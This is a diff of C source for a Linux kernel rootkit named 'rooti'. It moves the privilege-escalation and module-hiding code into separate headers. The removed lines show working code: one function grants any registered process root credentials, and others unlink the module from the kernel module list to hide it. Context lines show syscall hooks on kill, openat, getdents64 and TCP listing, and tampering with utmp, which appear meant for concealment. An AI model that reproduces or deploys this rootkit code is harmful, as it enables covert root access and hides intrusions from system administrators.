@@ -3,12 +3,13 @@
 #include <linux/kernel.h>
 #include <linux/types.h>
 #include <linux/string.h>
-#include <linux/cred.h>
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
 #include <linux/seq_file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
+#include "pe.h"
+#include "mod_hiding.h"
 #include "hooking.h"
 #include "utmp.h"
 
@@ -64,13 +65,6 @@ static LIST_HEAD(rooti_proc_tamper_fds);
 // List of FDs of /var/run/utmp opened by userspace processes
 static LIST_HEAD(rooti_utmp_tamper_fds);
 
-/* Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
- * When hidden, the variable rooti_prev_module stores the address of the node that was previous
- * before this module in the list, otherwise it is NULL;
-*/
-static bool rooti_hidden = false;
-static struct list_head *rooti_prev_module = NULL;
-
 // References to the original syscall handlers which we are hooking
 static asmlinkage long (*rooti_orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_openat)(const struct pt_regs *regs);
@@ -81,30 +75,6 @@ static asmlinkage long (*rooti_orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);
 
 static int (*rooti_orig_tcp4_seq_show)(struct seq_file *seq, void *v);
-
-/*
-    Escalates the privilege of the current process in execution to root user & group.
-*/
-static int rooti_elevate_privilege(void)
-{
-    // Prepare new set of credentials
-    struct cred *creds = prepare_creds();
-    if (creds == NULL) {
-        printk(KERN_DEBUG "rooti: prepare_creds() failed, out of memory\n");
-        return -ENOMEM;
-    }
-
-    // Modify credentials to those of root user & group
-    creds->uid.val = creds->gid.val = 0;
-    creds->euid.val = creds->egid.val = 0;
-    creds->suid.val = creds->sgid.val = 0;
-    creds->fsuid.val = creds->fsgid.val = 0;
-
-    // Commit new set of credentials in the context of the process in execution
-    commit_creds(creds);
-
-    return 0;
-}
 
 /*
     Registers a new client user process.
@@ -119,25 +89,7 @@ static int rooti_register_client(pid_t pid)
     return rooti_elevate_privilege();
 }
 
-/*
-    Hides this rootkit by removing it from the kernel modules list.
-*/
-static void rooti_hideme(void)
-{
-    rooti_hidden = true;
-    rooti_prev_module = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-}
 
-/*
-    Reveals this rootkit by re-adding it to the kernel modules list.
-*/
-static void rooti_showme(void)
-{
-    rooti_hidden = false;
-    list_add(&THIS_MODULE->list, rooti_prev_module);
-    rooti_prev_module = NULL;
-}
 
 static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
 {
